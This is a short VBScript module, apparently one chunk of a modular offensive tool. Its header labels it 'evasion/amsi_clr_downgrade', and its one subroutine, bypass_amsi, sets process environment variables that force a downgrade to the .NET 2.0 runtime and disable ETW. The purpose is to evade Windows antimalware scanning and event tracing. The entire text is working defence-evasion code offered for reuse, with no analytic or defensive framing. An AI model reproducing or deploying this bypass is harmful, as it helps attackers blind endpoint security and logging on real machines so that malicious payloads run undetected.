' chunk: evasion/amsi_clr_downgrade
' depends: (none)
' provides: bypass_amsi
' format: vbscript
' note: AMSI bypass via CLR downgrade and ETW disable in process env

Sub bypass_amsi()
    On Error Resume Next
    Dim sh, env
    Set sh = CreateObject("WScript.Shell")
    Set env = sh.Environment("Process")
    env("COMPLUS_Version") = "v2.0.50727"
    env("COMPLUS_ETWEnabled") = "0"
End Sub
